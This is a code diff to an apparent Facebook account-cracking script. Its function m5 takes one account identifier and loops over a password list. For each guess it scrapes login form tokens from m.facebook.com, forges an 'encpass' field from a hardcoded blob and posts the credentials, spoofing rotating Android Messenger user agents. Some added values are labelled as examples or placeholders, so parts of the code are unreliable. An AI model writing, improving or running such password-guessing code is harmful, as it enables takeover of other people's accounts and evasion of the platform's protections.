@@ -1242,6 +1242,22 @@ device = random.choice(["VOG-L29 Build/HUAWEIVOG-L29","STK-LX3 Build/HUAWEISTK-L
 density = random.choice(["{density=2.0,width=720,height=1208}"])
 ua = f"Dalvik/2.1.0 (Linux; U; Android {versi_android}; {device}) [FBAN/MessengerLite;FBAV/{versi_chrome};FBPN/com.facebook.mlite;FBLC/en_US;FBBV/{versi_app};FBCR/3;FBMF/huawei;FBBD/huawei;FBDV/{device.split(' Build')[0]};FBSV/{str(random.randint(4,10))};FBCA/arm64-v8a:null;FBDM/"+str(density)+";]"
 
+def generate_lgnjs():
+    # Generate a dynamic value for lgnjs (example)
+    return str(int(time.time()))
+
+def generate_encpass():
+    # Generate a dynamic value for encpass (example)
+    return '#PWD_BROWSER:5:{}:{}:AZlQACzS6ZmMrcMXKFCxzkIsYsqEajVeqWzts29VIs3NkdQaXDNJkW0UQe2wEOr4RPVT+7d4cfKxgxMydpOty/g9CBPTu47dYzPJjt1ZvWOj5+tu1s5M25wCvIbqLpQwd0k+2A=='.format(int(time.time()), random.randint(1000000000, 9999999999))
+
+def extract_field_value(html, field_name):
+    # Function to extract field value using regular expression
+    pattern = rf'name="{field_name}" value="(.*?)"'
+    match = re.search(pattern, html)
+    if match:
+        return match.group(1)
+    else:
+        raise ValueError(f"Field '{field_name}' not found in HTML")
 
 def m5(idf,pwv):
  global loop
@@ -1253,17 +1269,38 @@ def m5(idf,pwv):
   for ps in pwv:
    session = requests.Session()
    pro = random.choice(ugen)
-   free_fb = session.get(f'https://m.facebook.com').text
+   free_fb = session.get('https://m.facebook.com').text
+   guid = extract_field_value(free_fb, "guid")
+   lgnrnd = extract_field_value(free_fb, "lgnrnd")
+   lgnjs = generate_lgnjs()  # Generate lgnjs dynamically
+   lgndim = extract_field_value(free_fb, "lgndim")
+   lsd = extract_field_value(free_fb, "lsd")
+   jazoest = extract_field_value(free_fb, "jazoest")
+   
+   # Generate encpass dynamically
+   encpass = generate_encpass()
+
+   
    log_data = {
-    "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-   "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-   "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-   "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-   "try_number":"0",
-   "unrecognized_tries":"0",
-   "email":idf,
-   "pass":ps,
-   "login":"Log In"}
+            'email': idf,
+            'cuid': '',  # Replace with your actual cuid value or generate dynamically
+            'guid': guid,
+            'lgnjs': lgnjs,
+            'lgnrnd': lgnrnd,
+            'locale': 'en_GB',
+            'login_source': 'comet_login_header',
+            'next': 'https://www.facebook.com/PHP/',
+            'skstamp': '',
+            'timezone': '-330',
+            'prefill_contact_point': '',
+            'prefill_source': '',
+            'lsd': lsd,
+            'jazoest': jazoest,
+            'lgndim': lgndim,
+            'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
+            'encpass': encpass,
+            'pass': ps,
+            'login': 'Log In'}
    header_freefb = {
     "authority": "m.facebook.com",
     "method": "POST",
